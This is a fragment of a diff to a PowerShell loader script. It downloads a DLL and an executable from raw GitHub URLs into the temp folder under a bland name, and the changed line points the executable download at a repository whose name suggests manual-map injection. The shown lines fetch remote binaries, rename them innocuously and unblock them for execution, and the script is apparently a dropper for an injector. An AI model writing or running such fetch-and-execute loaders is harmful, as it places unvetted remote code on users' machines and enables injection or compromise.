@@ -17,7 +17,7 @@ Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction S
 Start-Sleep -Seconds 2
 
 # STEP 1: Define EXE URL and path
-$exeUrl = "https://raw.githubusercontent.com/LOKIXFF/DHONI/refs/heads/main/audio.dg.exe"
+$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/audio.dg.exe"
 $tempExe = "$env:TEMP\ConsoleApplication6.exe"
 
 # Download and unblock EXE
